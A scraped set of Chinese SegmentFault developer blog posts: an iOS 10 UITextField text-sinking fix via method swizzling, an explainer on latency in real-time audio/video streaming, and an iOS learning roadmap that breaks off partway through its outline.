<p><span class=""img-wrap""><img data-src=""/img/remote/1460000014745080"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""优酷.png"" title=""优酷.png""></span></p>
<p>我们看到，简书APP、美团APP和优酷APP都有这种问题，除此之外还有很多APP有这种情况就不一一列举了，当然还有我们自己的APP😂。</p>
<p>经测试，iOS9和iOS 11没有这种问题，再加上网上搜了一下基本确定是iOS 10的bug，但奇怪的是iPhone自带的APP里面的UITextField竟然没有这种问题，苹果爸爸可真是坑得一逼啊🙄。</p>
<p>先让我们看看到底是什么在捣鬼，先通过Debug View Hierarchy来看下UITextField在输入状态下，视图层级是怎么样的：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000014745081"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""UITextField效果.png"" title=""UITextField效果.png""></span></p>
<p>通过上图我们可以看到UITextField在输入状态下，上面有一个UIFieldEditor视图，它是一个UIScrollView的子类。（这里补充一下，UITextField在未输入状态时也就是键盘收起时它上面有一个UITextFieldLabel用来展示内容。在输入状态时它上面会有一个UIFieldEditor视图，可以左右滚动。）我们还看到这个UIFieldEditor的_UIFiedEditorContentView在垂直方向上和UITextField发生了一点点错位，问题就出在这里。</p>
<p>我们来看下不同系统下，这个UIFieldEditor的差异在哪里：</p>
<pre><code>//iOS9 中文
&lt;UIFieldEditor: 0x7f853e85e800; frame = (0 0; 253 28); 
text = '撒开发和科技啊话费卡很舒服大方还是咖啡和卡卡发货啊...'; 
clipsToBounds = YES; 
opaque = NO; 
gestureRecognizers = &lt;NSArray: 0x7f853dd90af0&gt;;
layer = &lt;CALayer: 0x7f853dd728e0&gt;; 
contentOffset: {7902, 0}; 
contentSize: {8155, 28}&gt;

//iOS 11 中文
&lt;UIFieldEditor: 0x7fad4b024a00; frame = (0 0; 253 28); 
text = '法卡身份卡上开发开始发售克服恐惧啊身份卡身份卡是否...'; 
opaque = NO; 
gestureRecognizers = &lt;NSArray: 0x60000024be20&gt;; 
layer = &lt;CALayer: 0x600000032c00&gt;; 
contentOffset: {6840, 0}; 
contentSize: {7101, 36.5}; 
adjustedContentInset: {0, 0, 0, 0}&gt;

//iOS 10 全英文
&lt;UIFieldEditor: 0x7fd641001600; frame = (0 0; 280 28); 
text = 'Ghghdghdhddgdgdgdgdgfdgfd...'; 
clipsToBounds = YES; 
opaque = NO; 
gestureRecognizers = &lt;NSArray: 0x600000056f20&gt;; 
layer = &lt;CALayer: 0x60000002ac40&gt;; 
contentOffset: {1404.5, 0}; 
contentSize: {1686, 28}&gt;

//iOS 10 中文
&lt;UIFieldEditor: 0x7feebe834a00; frame = (28 0; 225 28); 
text = '啥开始分开哈萨克还是个哈时光撒个哈是个好撒个撒个很...'; 
opaque = NO; 
gestureRecognizers = &lt;NSArray: 0x60000005ac70&gt;; 
layer = &lt;CALayer: 0x600000029ae0&gt;; 
contentOffset: {620, -3}; 
contentSize: {846, 28}&gt;</code></pre>
<p>注意观察contentOffset属性，在iOS 9和iOS 11以及iOS 10输入全英文字符时contentOffset.y = 0，而在iOS 10输入全中文时contentOffset.y = -3，是不是有种日了狗的感觉？</p>
<p>到此，问题的根源算是找到了，那怎么比较合理地解决这个bug呢？如果你曾经遇到过这个问题并且在网络上搜索过解决方案，你或许会搜索下面的解决方案：</p>
<pre><code>//重写UITextField，然后重写以下方法：
- (CGRect)textRectForBounds:(CGRect)bounds {
    return CGRectInset(bounds, 2, 1);
}

- (CGRect)editingRectForBounds:(CGRect)bounds {
    return CGRectInset(bounds, 2, 1);
}</code></pre>
<p>这种方式可能会让文字下沉效果不是那么明显，但是这些数字从哪来的呢，没有任何理论和数据支撑啊，就这样粗糙的解决难免会留下坑。而且提到UITextField的bug，我们肯定会想到UISearchBar吧？我们看下UISearchBar的效果：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000014745082"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""UISearchBar效果.png"" title=""UISearchBar效果.png""></span></p>
<p>同样的问题啊！毕竟UISearchBar上面放着一个UITextField，而且如果我们用到UISearchDisplayController或者UISearchController，那我们是不是也要挨个改一遍呢？</p>
<p>显然这种方式是不可取的，这时候我们就需要利用runtime了。我们只需要利用runtime交换掉UITextField的layoutSubViews方法，在交换后的方法里面通过遍历子视图拿到这个UIFieldEditor，然后强行把它的contentOffset.y改成0就可以了。因为我们发现在iOS9和iOS 11以及iOS 10输入全英文字符状态下它显示正常时就是contentOffset.y = 0，这是有理论和数据支撑的。然后，考虑到这个问题是针对iOS 10系统下的，避免对其他系统或者新系统（比如系统哪天升级到iOS 12，系统对UITextField进行了重构）造成潜在影响，我们可以保守一点，只针对iOS 10系统时交换方法。</p>
<p>代码如下：</p>
<pre><code>//
//  UITextField+Fix.m
//  
//
//  Created by 简书Code_Ninja
//  Copyright https://github.com/lqcjdx
//

#import ""UITextField+Fix.h""
#import &lt;objc/runtime.h&gt;

@implementation UITextField (Fix)
void swizzleMethod(Class class,SEL originalSelector,SEL swizzledSelector){
    Method originalMethod = class_getInstanceMethod(class, originalSelector);
    Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
    BOOL didAddMethod = class_addMethod(class, originalSelector, method_getImplementation(swizzledMethod), method_getTypeEncoding(swizzledMethod));
    if(didAddMethod){
        class_replaceMethod(class, swizzledSelector, method_getImplementation(originalMethod), method_getTypeEncoding(originalMethod));
    }else{
        method_exchangeImplementations(originalMethod, swizzledMethod);
    }
}

+ (void)load
{
    CGFloat systemVersion = [[UIDevice currentDevice].systemVersion floatValue];
    if(systemVersion &gt;= 10.0 &amp;&amp; systemVersion &lt; 11.0){
        static dispatch_once_t onceToken;
        dispatch_once(&amp;onceToken, ^{
            Class class = [self class];
            swizzleMethod(class, @selector(layoutSubviews), @selector(yl_layoutSubviews));
        });
    }
}

- (void)yl_layoutSubviews
{
    [self yl_layoutSubviews];
    for(UIScrollView *view in self.subviews){
        if([view isKindOfClass:[UIScrollView class]]){
            CGPoint offset = view.contentOffset;
            if(offset.y != 0) {
                offset.y = 0;
                view.contentOffset = offset;
            }
            break;
        }
    }
}

@end</code></pre>
<p>这样的好处是非常方便，无需修改已有代码，只需在项目中新建一个UITextField分类就可以一键修复UITextField、UISearchBar、UISearchDisplayController、UISearchController的输入中文时文字下沉的问题。</p>
<p>修改后的效果：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000014745083"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""修改后的效果.png"" title=""修改后的效果.png""></span></p>
<p>好了，就写到这里了，看完记得去你的项目中看看在iOS 10系统下有没有这个问题哦。如果你有其他解决方案欢迎留言。</p>

                ", 如何修复UITextField在iOS10文字下沉问题,1531971868,472,1,669,1,1,https://segmentfault.com/a/1190000014745073
13,1,0,6,"
                    
<blockquote><em>高泽华，声网 Agora 音频工匠，先后在中磊电子、士兰微电子、虹软科技主导音频项目。任职 YY 期间负责语音音频技术工作。在音乐、语音编解码方面有超过十年的研发经验。</em></blockquote>
<p>音视频实时通讯的应用场景已经随处可见，从“吃鸡”的语音对讲、直播连麦、直播答题组队开黑，再到银行视频开户等。对于开发者来讲，除了关注如何能快速实现不同应用场景重点额音视频通讯，另一个更需要关注的可能就是“低延时”。但是，到底实时音视频传输延时应该如何“低”，才能满足你的应用场景呢？</p>
<h2>延时的产生与优化</h2>
<p>在聊低延时之前，我们先要讲清延时是如何产生的。由于音视频的传输路径一样，我们可以通过一张图来说明延时的产生:</p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/23/162f120b7e279b5e?w=1494&amp;h=538&amp;f=png&amp;s=74786"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在音视频传输过程中，在不同阶段都会产生延时。总体可以分为三类：</p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/23/162f122572409a19?w=1290&amp;h=452&amp;f=png&amp;s=92929"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h3>T1：设备端上的延时</h3>
<p>音视频数据在设备端上产生延时还可以细分。设备端上的延时主要与硬件性能、采用的编解码算法、音视频数据量相关，设备端上的延时可达到 30~200ms，甚至更高。如上表所示，音频与视频分别在采集端或播放端产生延时的过程基本相同，但产生延时的原因不同。</p>
<p><strong>音频在设备端上的延时：</strong></p>
<ul>
<li>音频采集延时：采集后的音频首先会经过声卡进行信号转换，声卡本身会产生延时，比如 M-Audio 声卡设备延迟 1ms，艾肯声卡设备延迟约为 37ms；</li>
<li>编解码延时：随后音频进入前处理、编码的阶段，如果采用 OPUS 标准编码，最低算法延时大约需要 2.5~60ms；</li>
<li>音频播放延时：这部分延时与播放端硬件性能相关。</li>
<li>音频处理延时：前后处理，包括 AEC，ANS，AGC 等前后处理算法都会带来算法延时，通常这里的延时就是滤波器阶数。在 10ms 以内。</li>
<li>端网络延时：这部分延时主要出现在解码之前的 jitter buffer 内，如果在抗丢包处理中，增加了重传算法和前向纠错算法，这里的延时一般在 20ms 到 200ms 左右。但是受到 jitter buffer 影响，可能会更高。</li>
</ul>
<p><strong>视频在设备端上的延时：</strong></p>
<ul>
<li>采集延时：采集时会遇到成像延迟，主要由 CCD 相关硬件产生，市面上较好的 CCD 一秒可达 50 帧，成像延时约为 20ms，如果是一秒 20~25 帧的 CCD，会产生 40~50ms 的延时；</li>
<li>编解码延时：以 H.264 为例，它包含 I、P、B 三种帧（下文会详细分析），如果是每秒 30 帧相连帧，且不包括 B 帧（由于 B 帧的解码依赖前后视频帧会增加延迟），采集的一帧数据可能直接进入编码器，没有 B 帧时，编码的帧延时可以忽略不计，但如果有 B 帧，会带来算法延时。</li>
<li>视频渲染延时：一般情况下渲染延时非常小，但是它也会受到系统性能、音画同步的影响而增大。</li>
<li>端网络延时：与音频一样，视频也会遇到端网络延时。</li>
</ul>
<p>另外，在设备端，CPU、缓存通常会同时处理来自多个应用、外接设备的请求，如果某个问题设备的请求占用了 CPU，会导致音视频的处理请求出现延时。以音频为例，当出现该状况时，CPU 可能无法及时填充音频缓冲区，音频会出现卡顿。所以设备整体的性能，也会影响音视频采集、编解码与播放的延时。</p>
<h3>T2：端与服务器间的延时</h3>
<p>影响采集端与服务器、服务器与播放端的延时的有以下主几个因素：客户端同服务间的物理距离、客户端和服务器的网络运营商、终端网络的网速、负载和网络类型等。如果服务器就近部署在服务区域、服务器与客户端的网络运营商一致时，影响上下行网络延时的主要因素就是终端网络的负载和网络类型。一般来说，无线网络环境下的传输延时波动较大，传输延时通常在 10~100ms 不定。而有线宽带网络下，同城的传输延时能较稳定的低至 5ms~10ms。但是在国内有很多中小运营商，以及一些交叉的网络环境、跨国传输，那么延时会更高。</p>
<h3>T3：服务器间的延时</h3>
<p>在此我们要要考虑两种情况，第一种，两端都连接着同一个边缘节点，那么作为最优路径，数据直接通过边缘节点进行转发至播放端；第二种，采集端与播放端并不在同一个边缘节点覆盖范围内，那么数据会经由“靠近”采集端的边缘节点传输至主干网络，然后再发送至“靠近”播放端的边缘节点，但这时服务器之间的传输、排队还会产生延时。仅以骨干网络来讲，数据传输从黑龙江到广州大约需要 30ms，从上海到洛杉矶大约需要 110ms~130ms。</p>
<p>在实际情况下，我们为了解决网络不佳、网络抖动，会在采集设备端、服务器、播放端增设缓冲策略。一旦触发缓冲策略就会产生延时。如果卡顿情况多，延时会慢慢积累。要解决卡顿、积累延时，就需要优化整个网络状况。</p>
<p>综上所述，由于音视频在采集与播放端上的延时取决于硬件性能、编解码内核的优化，不同设备，表现不同。所以通常市面上常见的“端到端延时”指的是 T2+T3。</p>
<h2>延时低≠通话质量可靠</h2>
<p>不论是教育、社交、金融，还是其它场景下，大家在开发产品时可能会认为“低延时”一定就是最好的选择。但有时，这种“追求极致”也是陷入误区的表现，低延时不一定意味着通讯质量可靠。由于音频与视频本质上的差异，我们需要分别来讲实时音频、视频的通讯质量与延时之间的关系。</p>
<h3>音频质量与延时</h3>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/23/162f14441d51d1b5?w=3116&amp;h=1449&amp;f=png&amp;s=121683"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""音频采样示意图"" title=""音频采样示意图""></span></p>
<p>影响实时音频通讯质量的因素包括：音频采样率、码率、延时。音频信息其实就是一段以时间为横轴的正弦波，它是一段连续的信号（如上图）。</p>
<p>采样率：是每秒从连续信号中提取并组成离散信号的采样个数。采样率越高，音频听起来越接近真实声音。</p>
<p>码率：它描述了单位时间长度的媒体内容需要空间。码率越高，意味着每个采样的信息量就越大，对这个采样的描述就越精确，音质越好。</p>
<p>假设网络状态稳定不变，那么采样率越高、码率越高，音质就越好，但是相应单个采样信息量就越大，那么传输时间可能会相对更长。</p>
<p>对照我们之前的公式，如果想要达到低延时，那么可以提高网络传输效率，比如提高带宽、网络速度，这在实验室环境下可以轻易实现。但放到生活环境中，弱网、中小运营商等不可控的问题必定会影响网络传输效率，最后结果就是通讯质量没有保障。还有一种方法，就是降低码率，那么会损失音质。</p>
<h3>视频质量与延时</h3>
<p>影响实时视频质量的因素包括：码率、帧率、分辨率、延时。其中视频的码率与音频码率相似，是指单位时间传输的数据位数。码率越大，画面细节信息越丰富，视频文件体积越大。</p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/23/162f145414885f3c?w=640&amp;h=479&amp;f=jpeg&amp;s=23697"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><strong>帧：</strong>正如大家所知，视频由一帧帧图像组成，如上图所示为 H.264 标准下的视频帧。它以 I 帧、P 帧、B 帧组成的 GOP 分组来表示图像画面（如下图）：I 帧是关键帧，带有图像全部信息；P 帧是预测编码帧，表示与当前与前一帧（I 或 P 帧）之间的差别；B 帧是双向预测编码帧，记录本帧与前后帧的差别。</p>
<p><strong>帧率：</strong>它是指每秒钟刷新的图像帧数。它直接影响视频的流畅度，帧率越大，视频越流畅。由于人类眼睛与大脑处理图像信息非常快，当帧率高于 24fps 时，画面看起来是连贯的，但这只是一个起步值。在游戏场景下，帧率小于 30fps 就会让人感到画面不流畅，当提升到 60fps 时会带来更实时的交互感，但超过 75fps 后一般很难让人感到有什么区别了。</p>
<p><strong>分辨率：</strong>是指单位英寸中所包含的像素点数，直接影响图像的清晰度。如果将一张 640 x 480 与 1024 x 768 的视频在同一设备上全屏播放，你会感到清晰度明显不同。</p>
<p>在分辨率一定的情况下，码率与清晰度成正比关系，码率越高，图像越清晰；码率越低，图像越不清晰。</p>
<p>在实时视频通话情况下，会出现多种质量问题，比如：与编解码相关的画面糊、不清晰、画面跳跃等现象，因网络传输问题带来的延时、卡顿等。所以解决了低延时，只是解决了实时音频通讯的一小部分问题而已。</p>
<p>综上来看，如果在网络传输稳定的情况下，想获得越低的延时，就需要在流畅度、视频清晰度、音频质量等方面进行权衡。</p>
<h2>不同场景下的延时</h2>
<p>我们通过下表看到每个行业对实时音视频部分特性的大致需求。但是每个行业，不仅对低延时的要求不同，对延时、音质、画质，甚至功耗之间的平衡也有要求。在有些行业中，低延时并非永远排在首位。</p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/23/162f146ce4925b88?w=1710&amp;h=564&amp;f=png&amp;s=120254"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><strong>游戏场景</strong></p>
<p>在手游场景下，不同游戏类型对实时音视频的要求不同，比如狼人杀这样的桌游，语音沟通是否顺畅，对游戏体验影响很大，所以对延时要求较高。其它类型游戏具体如下方表格所示。</p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/23/162f14b0ccdba473?w=1330&amp;h=132&amp;f=png&amp;s=100838"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>但满足低延时，并不意味着能满足手游开发的要求。因为手游开发本身存在很多痛点，比如功耗、安装包体积、安全性等。从技术层面讲，将实时音视频与手游结合时，手游开发关注的问题有两类：性能类与体验类。</p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/24/162f5786d7d6834e?w=1280&amp;h=158&amp;f=png&amp;s=41409"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在将实时音视频与手游结合时，除了延时，更注重包的大小、功耗等。安装包的大小直接影响用户是否安装，而功耗则直接影响游戏体验。</p>
<p><strong>社交直播场景</strong></p>
<p>目前的社交直播产品按照功能类型分有仅支持纯音频社交的，比如荔枝 FM；还有音视频社交的，比如陌陌。这两类场景对实时音视频的要求包括：</p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/24/162f5799d8176680?w=1298&amp;h=418&amp;f=png&amp;s=92218"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><strong>直播答题场景</strong></p>
<p>在直播答题场景中，对实时音视频的要求主要有如下两点：</p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/24/162f57a2fe5c0b34?w=1294&amp;h=176&amp;f=png&amp;s=38886"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>我们以前经常能看到主持人说完一道题，题目却还没发到手机上，最后只剩 3 秒的答题时间，甚至没看到题就已出局。该场景的痛点不是低延时，而是直播音视频与题目的同步，保证所有人公平，有钱分。</p>
<p><strong>K 歌合唱场景</strong></p>
<p>天天 K 歌、唱吧等 K 歌类应用中，都有合唱功能，主流形式是 A 用户上传完整录音，B 用户再进行合唱。实现实时合唱的主要需求有如下几点：</p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/24/162f57aaa4662998?w=1270&amp;h=292&amp;f=png&amp;s=72180"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在这个场景中，两人的歌声与音乐三者之间的同步给低延时提出了很高的要求。同时，音质也是关键，如果为了延时而大幅降低音质，就偏离了 K 歌应用的初衷。</p>
<p><strong>金融场景</strong></p>
<p>对于核保、银行开户来讲，需要一对一音视频通话。由于金融业特殊性，该类应用对实时音视频的需求，按照重要性来排序如下： </p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/24/162f57bd2ba88b0b?w=1270&amp;h=242&amp;f=png&amp;s=63197"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在这个场景中，低延时不是关键。重要的是，要保证安全性、双录功能和系统平台的兼容。</p>
<p><strong>在线教育</strong></p>
<p>在线教育主要分为两类：非 K12 在线教育，比如技术开发类教学，该场景对实时音视频的要求主要有：</p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/24/162f57c542a188ef?w=1266&amp;h=170&amp;f=png&amp;s=50279"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>很多非 K12 教学发生在单向直播场景下，所以延时要求并不高。</p>
<p>另一类是 K12 在线教育，比如英语外教、部分兴趣教学，通常会有一对一或一对多的师生连麦功能，它对直播场景的要求包括：</p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/24/162f57ccd370cb48?w=1272&amp;h=248&amp;f=png&amp;s=61517"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在 K12 的在线教育中，师生的连麦在低延时方面有较高的要求。如果会涉及跨国的英语教学，或需要面向偏远地区学生，那还要考虑海外节点部署、中小运营商网络的支持等。</p>
<p><strong>在线抓娃娃</strong></p>
<p>在线抓娃娃是近期新兴热点，主要依靠实时音视频与线下娃娃机来实现。它对实时音视频的要求包括：</p>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/24/162f57d37a478de9?w=1264&amp;h=242&amp;f=png&amp;s=61497"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>瓶颈与权衡</h2>
<p><span class=""img-wrap""><img data-src=""https://user-gold-cdn.xitu.io/2018/4/24/162f57e7486ba183?w=900&amp;h=500&amp;f=jpeg&amp;s=17629"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>产品的开发追求极致，需要让延时低到极限。但理想丰满，现实骨感。我们曾在上文提到，延时是因多个阶段的数据处理、传输而产生的。那么就肯定有它触及天花板的时候。</p>
<p>我们大胆假设，要从北京机场传输一路音视频留到上海虹桥机场。我们突破一切物理环境、财力、人力限制，在两地之间搭设了一条笔直的光纤，且保证真空传输（实际上根本不可能）。两地之间距离约为 1061 km。通过计算可知，传输需要约 35ms。数据在采集设备与播放设备端需要的采集、编解码处理与播放缓冲延时计为较高的值，30ms。那么端到端的延时大概需要 65ms。请注意，我们在这里还忽略了音视频文件本身、系统、光的衰减等因素带来的影响。</p>
<p>所以，所谓“超低延时”也会遇到瓶颈。在任何实验环境下都可以达到很低的延时，但是到实际环境中，要考虑边缘节点的部署、主干网络拥塞、弱网环境、设备性能、系统性能等问题，实际延时会更大。在一定的网络条件限制下，针对不同场景选择低延时方案或技术选型时，就需要围绕延时、卡顿、音频质量、视频清晰度等指标进行权衡与判断。</p>
<hr>
<p>声网Agora 有奖征文活动 正在进行中，只要你分享与声网SDK相关的开发经验博文，即有机会获得Cherry 机械键盘、T恤等声网定制奖品。<a href=""https://dev.agora.io/cn/article/23"" rel=""nofollow noreferrer"">详情请戳这里</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bV9lGL"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>

                ", 详解音视频直播中的低延时,1531971870,177,1,599,1,1,https://segmentfault.com/a/1190000014558041
14,1,0,6,"
                    
<h1>iOS开发学习路线</h1>
<h2>前言</h2>
<p>这里筑梦师,是一名正在努力学习的iOS开发工程师,目前致力于全栈方向的学习,希望可以和大家一起交流技术,共同进步,用简书记录下自己的学习历程.</p>
<blockquote><a href=""https://www.jianshu.com/p/19265c17f99b"" rel=""nofollow noreferrer"">个人学习方法分享</a></blockquote>
<pre><code>本文阅读建议
1.一定要辩证的看待本文.
2.本文主要是本人对iOS开发经验中总结的知识点
3.本文所有观点仅代表本人.
4.本文只阐述学习路线和学习当中的重点问题.需要读者自己使用百度进行拓展学习.
5.本文所表达观点并不是最终观点,还会更新,因为本人还在学习过程中,有什么遗漏或错误还望各位指出.
6.觉得哪里不妥请在评论留下建议~
7.觉得还行的话就点个小心心鼓励下我吧~</code></pre>
<hr>
<pre><code>目录
1.对本职业看法
2.学习方法
3.职业规划
4.iOS开发学习路线
5.iOS基础知识点
6.iOS中级知识点
7.iOS高级知识点
8.官方Kit</code></pre>
<hr>
<h2>对本职业看法</h2>
<p>16年我尝试加入各种iOS开发交流群,群里的气氛大致就是:学什么iOS,iOS完了,OC完了.群里大致三种人:谁有企业开发证书,马甲包了解一下,iOS某网课推广.至今,大部分iOS开发群还都是仅供吹水用,偶尔能碰见几个好心人解决一下问题.</p>
<hr>
<h3>个人观点</h3>
<p>个人观点:iOS开发这个职业,不是别人说完就完的,那些说完了的人都是因为技术菜,没有权威性,不想想自己为什么菜,为什么没有和唐巧王巍在一个高度,因为菜.</p>
<p>还没有到达一个高度就轻易否定一个职业,注定被这个职业淘汰.</p>
<p>所以,无视掉这种人这么荒谬的观点,那些真正有技术,懂得学习的iOS高级开发工程师,现在正在各大企业(腾讯百度阿里等),一句话,不要有比上不足比下有余的态度.努力学习.</p>
<p>真正会学习的人,不会说iOS完了,而是想着如何提升自己,你想想,真正牛逼的人,真的只会iOS开发这一种吗?</p>
<hr>
<h2>学习方法</h2>
<blockquote>面对有难度的功能,不要忙着拒绝,而是挑战一下,学习更多知识.<p>尽量独立解决问题,而不是在遇到问题的第一想法是找人.</p>
<p>多学习别人开源的第三方库,能够开源的库一定有值得学习的地方,多去看别的大神的博客.</p>
<p>作为一个程序员,如果你停止了学习,你也必将会被这个团队淘汰.</p>
<p>要把学习的技能当做兴趣,而不是为了挣钱去学习,是为了学习技能而学习.</p>
<p>有给自己定制一个详细的职业规划和人生规划,大到5~10年,小到近3年(并且细化到月)的计划.</p>
<p>不要盲目的面试,要针对即将面试的工作,准备面试.</p>
<p>首先针对一个自己没有接触到的知识,先使用 百度谷歌等网站搜索资料.然后进行学习</p>
<p>这是个好东西,我劝你多用用<a href=""https://developer.apple.com/search/"" rel=""nofollow noreferrer"">https://developer.apple.com/s...</a></p>
<p>尝试写一个demo,对新技术进行熟悉.</p>
<p>如果市面上有成熟的Demo或者第三方库,下载下来进行学习.</p>
<p>在熟悉的过程中,遇到了任何问题,再进行百度/谷歌,学习不同人的不同看法和解决方法.</p>
</blockquote>
<hr>
<h2>职业规划</h2>
<h3>个人观点</h3>
<p>首先是针对iOS这个行业,找不到工作要从自身找原因,为什么自己没有大公司的工作经历,为什么大公司会把自己毙掉,因为实力不够,因为你菜,你不够强.要从自身找原因,是,培训机构一阵子培训了一堆iOS开发工程师,但你不能从特么一堆菜鸟中杀出去,你就是菜鸟,不要怨天尤人了,好好努力学习.</p>
<p>不要只做到鹤立鸡群,而想着怎么离开这群鸡,重归鹤群.</p>
<p>针对程序员行业,这是一个需要努力奋斗的行业,也许他并不需要你有多高的文凭,好的文凭可以去大公司工作,没有好的文凭,但拥有丰富的工作经验,和开源库,也会是你本人实力的体现.所以,努力学习,路是自己走出来的,原地踏步谁也救不了你.</p>
<p>职业规划一般分为两种,横向和纵向,程序员行业横向走项目经理提成获得分红,纵向发展成为技术经理,必要时可以自行创业</p>
<hr>
<h2>iOS开发学习路线</h2>
<h3>iOS定位</h3>
<ul><li>
<p>iOS定位</p>
<ul>
<li>简介:这里的定位,仅仅代表我个人意见,仅符合本笔记如何学习从哪里开始学习,怎么去学习来说.</li>
<li>
<p>尚未入门</p>
<ul><li>
<p>如何判断自己是否入门</p>
<ul>
<li>是否了解Mac</li>
<li>是否了解Xcode</li>
<li>是否了解Objective-C</li>
<li>是否会使用UI控件.</li>
<li>如果上面的都不了解,那说明你还没有入门,请从iOS学习路线开始学习.</li>
</ul>
</li></ul>
</li>
<li>
<p>初级iOS开发</p>
<ul>
<li>说明:作为一名初级的iOS开发,你需要具备以下技能</li>
<li>
<p>必备技能(全部都会的情况下查看下一项)</p>
<ul>
<li>Xcode的使用</li>
<li>
<p>第三方库的灵活使用</p>
<ul>
<li>AFN</li>
<li>MJRefresh</li>
</ul>
</li>
<li>各种网站的使用</li>
</ul>
</li>
<li>
<p>如何判断是否可以升阶</p>
<ul>
<li>是否了解AFNetworking 的实现原理</li>
<li>是否了解SDAutolayout/Masonry 一种布局库的原理</li>
<li>是否能够处理基本的iOS崩溃原因/无法编译原因/无法上架原因?</li>
<li>是否拥有了一定的工作效率,稳定的工作效率.(而不是说,上面派了一个活下来,忙都忙不完,天天加班,还一堆bug)</li>
<li>是否能够处理第三方库引起的崩溃.</li>
<li>是否可以很好的融入工作环境,完成每一阶段的工作指标,而不会让自己疲惫不堪.</li>
</ul>
</li>
<li>
<p>结论</p>
<ul>
<li>iOS中级开发说白了,就是你学会了基本的UI界面搭建,上架,沉淀一段时间,你觉得自己还适合这门行业,还适合,还能接受 这个所谓的iOS开发工程师的行业.你就可以说是一名中级iOS开发.</li>
<li>这个沉淀时间 大约在1年的实际工作中,就可以完成.</li>
<li>如果你觉得这门行业不适合你,请仔细结合自身情况,是否转另一门计算机语言,还是彻底转行.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>中级iOS开发</p>
<ul>
<li>说明:作为一名中级的iOS开发,你需要具备以下技能</li>
<li>
<p>必备技能(全部都会的情况下查看下一项)</p>
<ul>
<li>应用的内存处理</li>
<li>应用的推送处理</li>
<li>应用的模块化/单元测试</li>
<li>应用的第三方集成/集中化管理/稳定迭代</li>
<li>阅读强大的第三方源码/拥有快速上手新的第三方库的能力.</li>
<li>能够接受各种新功能的开发(这里是指,即使你没有做过,但是你仍然可以凭借着学习,解决任何业务需求:例如:蓝牙.AR.摄像头.硬件交互.等)</li>
<li>清楚明白数据的传递方式,应用与后台如何交换数据,交换数据的过程,结果,格式.</li>
<li>多线程的灵活使用.</li>
<li>各种并发事件的处理/以及界面的合理性/流畅度</li>
<li>设计模式的灵活使用.</li>
</ul>
</li>
<li>如何判断是否可以升阶</li>
<li>结论</li>
</ul>
</li>
<li>
<p>高级iOS开发</p>
<ul>
<li>说明:作为一名高级的iOS开发,你需要具备以下技能(我不是高级开发,所以这里只能给你们提供建议.)</li>
<li>
<p>必备技能</p>
<ul>
<li>应用的组件化/架构分层</li>
<li>数据结构，操作系统，计算机网络都有自己的了解和认知</li>
<li>Shell脚本/python/Ruby/JS 至少会一种.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li></ul>
<pre><code>***</code></pre>
<h3>详细学习路线</h3>
<ul><li>
<p>学习路线</p>
<ul>
<li>简介<br>这里只简单阐述一些概念性的东西,以及学习路线规划,真正的知识请从iOS基础知识点往下开始看.</li>
<li>
<p>Objective-C</p>
<ul>
<li>介绍</li>
<li>概念</li>
<li>编译原理</li>
</ul>
</li>
<li>
<p>程序启动原理</p>
<ul>
<li>
<p>App组成</p>
<ul>
<li>Info.plist</li>
<li>.pch</li>
</ul>
</li>
<li>打开程序</li>
<li>执行main函数</li>
<li>执行UIApplicationMain函数</li>
